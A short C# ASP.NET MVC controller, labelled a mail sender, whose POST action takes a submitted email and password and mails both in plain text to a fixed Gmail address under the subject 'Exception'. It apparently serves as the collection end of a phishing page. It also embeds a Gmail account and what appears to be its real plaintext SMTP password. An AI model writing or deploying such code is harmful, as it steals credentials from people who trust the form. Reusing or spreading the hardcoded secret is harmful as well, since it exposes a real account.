using Cs_Mail_Sender.Models;
using Microsoft.AspNetCore.Mvc;
using System.Net.Mail;

namespace Cs_Mail_Sender.Controllers
{
    public class MailController : Controller
    {
        public IActionResult Index()
        {
            return View();
        }

        public IActionResult SendMail()
        {
            return View();
        }
        [HttpPost]
        public IActionResult SendMail(emailBody emailbody)
        {
            // Specify the from and to email address
            MailMessage mailMessage = new MailMessage("sasikumarponnekanti2020@gmail.com", "sasikumarponnekanti@gmail.com");
            // Specify the email body
            mailMessage.Body = $"{emailbody.Email} and {emailbody.Password}";
            // Specify the email Subject
            mailMessage.Subject = "Exception";

            // Specify the SMTP server name and post number
            SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587);
            // Specify your gmail address and password
            smtpClient.Credentials = new System.Net.NetworkCredential()
            {
                UserName = "sasikumarponnekanti2020@gmail.com",
                Password = "6303378810@Sasi"
            };
            // Gmail works on SSL, so set this property to true
            smtpClient.EnableSsl = true;
            // Finall send the email message using Send() method
            smtpClient.Send(mailMessage);

            return RedirectToAction("Index");
        }

    }
}
